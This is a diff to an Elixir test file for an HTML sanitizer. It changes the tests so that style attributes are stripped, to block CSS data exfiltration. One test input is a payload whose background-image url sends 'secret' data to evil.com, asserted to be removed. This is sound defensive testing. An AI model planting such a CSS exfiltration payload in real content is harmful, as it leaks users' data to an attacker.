@@ -17,9 +17,19 @@ defmodule HeyiAm.HtmlSanitizerTest do
       assert HtmlSanitizer.sanitize(html) == html
     end
 
-    test "preserves style attributes" do
+    test "strips style attributes to prevent CSS data exfiltration" do
       html = "<div style=\"color: red;\">styled</div>"
-      assert HtmlSanitizer.sanitize(html) == html
+      result = HtmlSanitizer.sanitize(html)
+      assert result =~ "styled"
+      refute result =~ "style="
+    end
+
+    test "strips CSS exfiltration via background-image url" do
+      html = "<div style=\"background-image: url('https://evil.com/exfil?data=secret')\">content</div>"
+      result = HtmlSanitizer.sanitize(html)
+      assert result =~ "content"
+      refute result =~ "style="
+      refute result =~ "evil.com"
     end
 
     test "preserves data attributes" do
